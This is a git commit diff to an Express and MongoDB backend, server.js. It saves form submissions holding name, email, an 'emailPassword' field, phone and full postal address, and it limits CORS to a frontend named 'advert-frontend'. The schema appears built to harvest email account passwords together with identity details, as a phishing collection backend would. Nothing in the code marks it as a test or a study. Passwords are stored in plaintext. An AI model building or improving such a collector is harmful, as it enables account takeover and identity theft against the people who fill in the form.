3bc63deac7f2f61014015e7b59aa4c14d2b4813e
Arminary <arimoroadeifeoluwa@gmail.com>
2024-11-03 21:42:08 +0100

    updated version 1

--- form-app-backend/server.js
+++ form-app-backend/server.js
@@ -1,34 +1,34 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
-require('dotenv').config();
+require('dotenv').config();   
 
 const app = express();
 const port = process.env.PORT || 5000;
-// app.use(cors(
-//   {
-//       origin : ["https://advert-frontend.vercel.app"],
-//       methods : ['POST', 'GET'],
-//       credentials: true
-//   }
-// ));
+
+
+app.use(cors({
+  origin: ["https://advert-frontend.vercel.app"], 
+  methods: ['POST', 'GET'],
+  credentials: true
+}));
 
 // Middleware
-app.use(cors());
 app.use(express.json());
 
-// Connect to MongoDB
+
 mongoose.connect(process.env.MONGODB_URI, {
   useNewUrlParser: true,
-  useUnifiedTopology: true,
-}).then(() => console.log('MongoDB connected'))
-  .catch((error) => console.log(error));
+  useUnifiedTopology: true
+})
+  .then(() => console.log('MongoDB connected'))
+  .catch((error) => console.error('MongoDB connection error:', error));
 
 
 const formSchema = new mongoose.Schema({
   name: String,
   email: String,
-  emailPassword: String,
+  emailPassword: String,  
   phone: String,
   address: String,
   city: String,
@@ -36,21 +36,26 @@ const formSchema = new mongoose.Schema({
   country: String,
   zip: String,
 });
+
 const FormData = mongoose.model('FormData', formSchema);
 
-// POST endpoint to receive form data
+
 app.post('/submit', async (req, res) => {
   const formData = new FormData(req.body);
   try {
     await formData.save();
     res.status(201).send('Form data saved successfully');
   } catch (error) {
+    console.error('Error saving form data:', error);
     res.status(500).send('Error saving form data');
   }
 });
+
+
 app.get('/', (req, res) => {
   res.send('Backend server is running!');
 });
 
 
-app.listen(port, () => console.log(`Running on port ${port}`));
+app.listen(port, () => console.log(`Server running on port ${port}`));
+
